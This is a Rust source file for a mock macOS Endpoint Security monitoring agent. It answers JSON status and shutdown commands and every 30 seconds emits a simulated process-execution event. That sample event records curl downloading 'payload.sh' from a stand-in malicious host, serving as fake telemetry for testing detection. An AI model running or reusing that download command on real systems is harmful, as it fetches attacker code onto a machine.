use serde::{Deserialize, Serialize};
use chrono::Utc;
use tokio::io::{AsyncBufReadExt, BufReader};
use std::sync::Arc;
use tokio::sync::Mutex;
use once_cell::sync::Lazy;

static STDOUT_LOCK: Lazy<Arc<Mutex<()>>> = Lazy::new(|| Arc::new(Mutex::new(())));

#[derive(Deserialize, Debug)]
#[serde(tag = "type")]
enum Command {
    GetStatus { id: String },
    Shutdown,
}

#[derive(Serialize, Debug)]
struct Response {
    id: Option<String>,
    success: bool,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<serde_json::Value>,
    timestamp: String,
}

async fn emit_response(id: Option<String>, success: bool, message: String, data: Option<serde_json::Value>) {
    let resp = Response { id, success, message, data, timestamp: Utc::now().to_rfc3339() };
    if let Ok(json) = serde_json::to_string(&resp) {
        let _lock = STDOUT_LOCK.lock().await;
        println!("{}", json);
    }
}

async fn emit_event(event_type: &str, data: serde_json::Value) {
    let mut payload = data;
    if let Some(obj) = payload.as_object_mut() {
        obj.insert("type".to_string(), serde_json::json!(event_type));
    }
    emit_response(None, true, "ESF_EVENT".to_string(), Some(payload)).await;
}

#[tokio::main]
async fn main() {
    // 1. Initial Handshake
    emit_response(None, true, "Sovereign ESF Agent Active (macOS Sonoma+)".to_string(), None).await;

    // 2. MOCK: Endpoint Security Callback Loop
    // In production, this would use `es_subscribe` to listen for:
    // ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_OPEN, ES_EVENT_TYPE_NOTIFY_CONNECT
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
            emit_event("ES_EXEC", serde_json::json!({
                "pid": 1234,
                "path": "/usr/bin/curl",
                "args": ["-O", "http://malicious.com/payload.sh"],
                "signing_id": "com.apple.curl"
            })).await;
        }
    });

    let mut stdin = BufReader::new(tokio::io::stdin()).lines();
    while let Ok(Some(line)) = stdin.next_line().await {
        if let Ok(cmd) = serde_json::from_str::<Command>(line.trim()) {
            match cmd {
                Command::GetStatus { id } => {
                    emit_response(Some(id), true, "Active".to_string(), None).await;
                },
                Command::Shutdown => {
                    std::process::exit(0);
                }
            }
        }
    }
}
